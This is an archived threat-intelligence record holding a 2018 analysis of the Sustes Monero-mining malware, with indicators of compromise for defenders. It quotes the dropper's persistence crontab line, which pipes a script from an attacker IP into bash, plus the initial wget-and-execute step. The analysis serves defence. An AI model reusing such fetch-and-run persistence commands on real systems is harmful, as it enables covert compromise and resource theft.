{
    "id": "1ed70a9c-97dc-448f-8c4b-16f1d039d739",
    "created_at": "2023-01-12T15:01:51.150668Z",
    "updated_at": "2025-03-27T02:06:14.71393Z",
    "deleted_at": null,
    "sha1_hash": "917d46c2e47e2cea0a705d6d33fe26e68cf0ccf9",
    "title": "2018-09-20 - Sustes Malware- CPU for Monero",
    "authors": "",
    "file_creation_date": "2022-05-28T17:54:09Z",
    "file_modification_date": "2022-05-28T17:54:09Z",
    "file_size": 298146,
    "plain_text": "# Sustes Malware: CPU for Monero\n\n**marcoramilli.com/2018/09/20/sustes-malware-cpu-for-monero/**\n\nView all posts by marcoramilli September 20, 2018\n\nToday I’d like to share a simple analysis based on fascinating threat that I like to call Sustes (you will see name genesis in a bit).\nEverybody knows Monero crypto currency and probably everybody knows that it has built upon privacy, by meaning It’s not that\nsimple to figure out Monero wallet balance. Sustes (mr.sh) is a nice example of Pirate-Mining and even if it’s hard to figure out its\nmagnitude, since the attacker built-up private pool-proxies, I believe it’s interesting to fix wallet address in memories and to share\nIoC for future Protection. So, let’s have a closer look to it.\n\n\n-----\n\nMonero stops you trying to check wallet balance\n\nSustes Malware doesn’t infect victims by itself (it’s not a worm) but it is spread over exploitation and brute-force activities with\nspecial focus on IoT and Linux servers. The initial infection stage comes from a custom wget\n(http:\\/\\/192[.]99[.]142[.]226[:]8220\\/mr.sh ) directly on the victim machine followed by a simple /bin/bash mr.sh. The script is a\nsimple bash script which drops and executes additional software with a bit of spicy. The following code represents the mr.sh content\nas a today (ref. blog post date).\n[https://gist.github.com/marcoramilli/a002b0620060e1804651565fc4026a4c.js](https://gist.github.com/marcoramilli/a002b0620060e1804651565fc4026a4c.js)\nAn initial connection-check wants to take down unwanted software on the victim side (awk ‘{print $7}’ | sed -e “s/\\/.*//g”) taking\ndecisions upon specific IP addresses. It filters PID from connection states and it directly kills them (kill -9). The extracted attacker’s\nunwanted communications are the following ones:\n\n103[.]99[.]115[.]220 (Org: HOST EDU (OPC) PRIVATE LIMITED, Country: IN)\n104[.]160[.]171[.]94 (Org: Sharktech Country: USA)\n121[.]18[.]238[.]56 (Org: ChinaUnicom, Country: CN)\n170[.]178[.]178[.]57 (Org: Sharktech Country: USA)\n27[.]155[.]87[.]59 (Org: CHINANET-FJ Country: CN)\n52[.]15[.]62[.]13 (Org:  Amazon Technologies Inc., Country: USA)\n52[.]15[.]72[.]79 (Org: HOST EDU (OPC) PRIVATE LIMITED, Country: IN)\n91[.]236[.]182[.]1 (Org: Brillant Auto Kft, Country: HU)\n\nA second check comes from “command lines arguments”. Sustes “greps” to search for configuration files (for example: wc.conf and\nwq.conf and wm.conf) then it looks for software names such as sustes (here we go !) and kills everything matches the “grep”. The\nscript follows by assigning to f2 variable the dropping website (192[.]99[.]142[.]226:8220) and later-on it calls “f2” adding specific\npaths (for example: /xm64 and wt.conf) in order to drop crafted components. MR.sh follows by running the dropped software with\nconfiguration file as follows:\n**nohup $DIR/sustes -c $DIR/wc.conf > /dev/null 2>&1 &**\nMR.SH ends up by setting a periodic crontab action on dropping and executing itself by setting up:\n**crontab -l 2>/dev/null; echo “* * * * * $LDR** **[http://192.99.142.226:8220/mr.sh | bash -sh > /dev/null 2>&1”](http://192.99.142.226:8220/mr.sh)**\nFollowing the analysis and extracting the configuration file from dropping URL we might observe the Monero wallet addresses and\nthe Monero Pools used by attacker. The following wallets (W1, W2, W3) were found.\n\nW1:\n4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg\nW2:\n4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg\nW3:\n4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg\n\nQuick analyses on the used Monero pools took me to believe the attacker built up a custom and private (deployed on private\ninfrastructures) monero pool/proxies, for such a reason I believe it would be nice to monitor and/or block the following addresses:\n\n158[.]69[.]133[.]20 on port 3333\n192[.]99[.]142[.]249 on port 3333\n202[.]144[.]193[.]110 on port 3333\n\n[The downloaded payload is named sustes and it is a basic XMRIG, which is a well-known opensource miner. In this scenario it is](https://github.com/xmrig/xmrig)\nused to make money at the expense of computer users by abusing the infected computer to mine Monero, a cryptocurrency. The\nfollowing image shows the usage strings as an initial proof of software.\n\n\n-----\n\nXMRIG prove 1\n\n[Many people are currently wondering what is the sustes process which is draining a lot of PC resources (for example: here,](https://www.digitalocean.com/community/questions/what-is-this-sustes-in-my-process-in-my-cpu-stats) [here](https://stackoverflow.com/questions/51705317/sustes-in-solr-running-and-using-lots-of-cpu-power)\n[and here ) …. now we have an answer: it’s a unwanted Miner. :D.](https://www.blackhatworld.com/seo/process-sustes-using-cpu-at-600.1045670/)\n\nHope you had fun\n\n**IoC**\n\n**IP Address:**\n\n103[.]99[.]115[.]220 (Org: HOST EDU (OPC) PRIVATE LIMITED, Country: IN)\n104[.]160[.]171[.]94 (Org: Sharktech Country: USA)\n121[.]18[.]238[.]56 (Org: ChinaUnicom, Country: CN)\n170[.]178[.]178[.]57 (Org: Sharktech Country: USA)\n27[.]155[.]87[.]59 (Org: CHINANET-FJ Country: CN)\n52[.]15[.]62[.]13 (Org:  Amazon Technologies Inc., Country: USA)\n52[.]15[.]72[.]79 (Org: HOST EDU (OPC) PRIVATE LIMITED, Country: IN)\n91[.]236[.]182[.]1 (Org: Brillant Auto Kft, Country: HU)\n\n**Custom Monero Pools:**\n\n158[.]69[.]133[.]20:3333\n192[.]99[.]142[.]249:3333\n202[.]144[.]193[.]110:3333\n\n**Wallets:**\n\n**W1:**\n4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg\n**W2:**\n4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg\n**W3:**\n4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-09-20 - Sustes Malware- CPU for Monero.pdf"
    ],
    "report_names": [
        "2018-09-20 - Sustes Malware- CPU for Monero.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535711,
    "ts_updated_at": 1743041174,
    "ts_creation_date": 1653760449,
    "ts_modification_date": 1653760449,
    "files": {
        "pdf": "https://archive.orkl.eu/917d46c2e47e2cea0a705d6d33fe26e68cf0ccf9.pdf",
        "text": "https://archive.orkl.eu/917d46c2e47e2cea0a705d6d33fe26e68cf0ccf9.txt",
        "img": "https://archive.orkl.eu/917d46c2e47e2cea0a705d6d33fe26e68cf0ccf9.jpg"
    }
}